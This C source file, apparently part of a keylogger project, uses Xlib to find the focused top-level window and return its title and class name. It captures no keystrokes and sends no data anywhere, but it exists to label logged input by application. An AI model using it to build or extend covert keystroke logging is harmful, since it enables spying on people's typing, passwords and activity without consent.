#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <locale.h>
#include <unistd.h>
#include "keylogger/utils/active_window.h"

static int x_error = 0;

static int handle_error(Display *display, XErrorEvent *error) {
    x_error = 1;
    return 1;
}

static int get_top_window(Display* d, Window *w){
  Window tmp = *w, parent = *w, root = None;
  Window *children;
  unsigned int nchildren;
  Status s;

  while (parent != root) {
    tmp = parent;
    s = XQueryTree(d, tmp, &root, &parent, &children, &nchildren);

    if (s) XFree(children);

    if (x_error) return 1;
  }

  *w = tmp;

  return 0;
}


static int get_window_name(Display *d, Window *w, char **window_name) {
    XTextProperty prop;
    Status s;

    *window_name = NULL;
    s = XGetWMName(d, *w, &prop);
    if (x_error || !s) {
        if (prop.value) XFree(prop.value);
        fprintf(stderr, "Error retrieving window name\n");
        return 1;
    }

    int count = 0, result;
    char **list = NULL;
    result = XmbTextPropertyToTextList(d, &prop, &list, &count);
    if (prop.value) XFree(prop.value);

    if (result == Success && list) {
        *window_name = strdup(list[0]);
        XFreeStringList(list);
        return 0;
    }
    if (list) XFreeStringList(list);

    return 1;
}

static int get_class_name(Display *d, Window *w, char **class_name) {
    XClassHint *class_hint;
    Status s;
    char tmp[256];

    *class_name = NULL;
    class_hint = XAllocClassHint();
    if(x_error) {
        XFree(class_hint);
        fprintf(stderr, "Error allocating class hint\n");
        return 1;
    }

    s = XGetClassHint(d, *w, class_hint);
    if (s && !x_error){
        char *tmp_name = class_hint->res_name ? class_hint->res_name : "Unknown";
        char *tmp_class = class_hint->res_class ? class_hint->res_class : "Unknown";
        snprintf(tmp, sizeof(tmp), "%s, %s", tmp_name, tmp_class);
        *class_name = strdup(tmp);
    }

    if (class_hint->res_name) XFree(class_hint->res_name);
    if (class_hint->res_class) XFree(class_hint->res_class);
    XFree(class_hint);

    return (*class_name == NULL) ? 1 : 0;
}

static void set_active_window_name(char *window_name, char *class_name, char **res) {
    char *wname = window_name ? window_name : "Unknown";
    char *cname = class_name ? class_name : "Unknown";
    size_t res_len = strlen(cname) + strlen(wname) + 3;
    *res = malloc(res_len);
    snprintf(*res, res_len, "%s: %s", wname, cname);

}

int get_active_window(Display *d, char **window) {
    Window w;
    int revert_to;

    XSetErrorHandler(handle_error);

    if (d == NULL){
        fprintf(stderr, "Display is NULL\n");
        return 1;
    }

    XGetInputFocus(d, &w, &revert_to);
    if (x_error || w == None) {
        fprintf(stderr, "No window in focus\n");
        return 1;
    }

    if (get_top_window(d, &w)) return 1;

    w = XmuClientWindow(d, w);
    if (x_error) {
        fprintf(stderr, "XmuClientWindow failed\n");
        return 1;
    }

    char* window_name = NULL;
    char* class_name = NULL;

    if (get_window_name(d, &w, &window_name)) fprintf(stderr, "window_name get failed, default: Unknown\n");
    if (get_class_name(d, &w, &class_name)) fprintf(stderr, "class_name get failed, default: Unknown\n");

    if (!window_name && !class_name)
        return 1;

    set_active_window_name(window_name, class_name, window);

    if (window_name) free(window_name);
    if (class_name) free(class_name);

    return 0;
}
